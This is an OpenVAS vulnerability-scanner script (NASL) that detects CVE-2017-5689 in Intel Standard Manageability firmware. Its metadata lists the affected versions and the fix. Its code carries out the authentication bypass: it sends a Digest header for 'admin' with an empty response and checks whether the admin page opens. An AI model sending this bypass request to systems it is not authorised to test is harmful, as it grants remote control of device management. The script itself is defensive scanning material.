###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_intel_standard_manageability_priv_esc_vuln.nasl 11919 2018-10-16 09:49:19Z mmartin $
#
# Intel Standard Manageability Privilege Escalation Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:intel:intel_standard_manageability";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810997");
  script_version("$Revision: 11919 $");
  script_cve_id("CVE-2017-5689");
  script_bugtraq_id(98269);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-16 11:49:19 +0200 (Tue, 16 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-05-05 15:39:37 +0530 (Fri, 05 May 2017)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Intel Standard Manageability Privilege Escalation Vulnerability");

  script_tag(name:"summary", value:"This host is running Intel system with Intel
  Standard Manageability and is prone to privilege escalation vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check if we are able to access the manageability features of this product.");

  script_tag(name:"insight", value:"The flaw exists due to mishandling of input
  in an unknown function.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unprivileged attacker to gain control of the manageability features provided
  by these products.");

  script_tag(name:"affected", value:"Intel Standard Manageability firmware
  versions 6.x before 6.2.61.3535, 7.x before 7.1.91.3272, 8.x before 8.1.71.3608,
  9.0.x and 9.1.x before 9.1.41.3024, 9.5.x before 9.5.61.3012, 10.x before 10.0.55.3000,
  11.0.x before 11.0.25.3001, 11.5.x and 11.6.x before 11.6.27.3264.");

  script_tag(name:"solution", value:"Upgrade to Intel Standard Manageability
  firmware versions 6.2.61.3535 or 7.1.91.3272 or 8.1.71.3608 or 9.1.41.3024 or
  9.5.61.3012 or 10.0.55.3000 or 11.0.25.3001 or 11.6.27.3264 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&amp;languageid=en-fr");
  script_xref(name:"URL", value:"https://arstechnica.com/security/2017/05/intel-patches-remote-code-execution-bug-that-lurked-in-cpus-for-10-years");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_intel_standard_manageability_detect.nasl");
  script_mandatory_keys("Intel/Standard/Manageability/version");
  script_require_ports("Services/www", 16992, 16993);

  script_xref(name:"URL", value:"https://downloadcenter.intel.com/download/26754");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!appPort = get_app_port(cpe:CPE)){
  exit(0);
}

url = "/index.htm";
sndReq = http_get_req(port:appPort, url:url);
rcvRes = http_keepalive_send_recv(port:appPort, data:sndReq);

if(rcvRes && "Server: Intel(R) Standard Manageability" >< rcvRes)
{
  match = eregmatch(string:rcvRes, pattern:'"Digest.(.*)", nonce="(.*)",stale');
  if(match[1] && match[2])
  {
    digest = match[1];

    nonce = match[2];
  } else {
    exit(0);
  }

  asp_session = string('Digest username="admin", realm="Digest:', digest, '", nonce="',
                        nonce, '", uri="/index.htm", response="", qop=auth, nc=00000001,
                        cnonce="cb199a22ab5646c7"');

  sndReq = http_get_req(port:appPort, url:url, add_headers:make_array("Authorization", asp_session));
  rcvRes = http_keepalive_send_recv(port:appPort, data:sndReq);

  if(rcvRes =~ "HTTP/1\.. 200" && "Server: Intel(R) Standard Manageability" >< rcvRes
             && ">Hardware Information" >< rcvRes && ">IP address" >< rcvRes && ">System ID" >< rcvRes
             && ">System<" >< rcvRes && ">Processor<" >< rcvRes && ">Memory<" >< rcvRes)
  {
    report = report_vuln_url(port:appPort, url: url);
    security_message(port: appPort, data: report);
    exit(0);
  }
}

exit(99);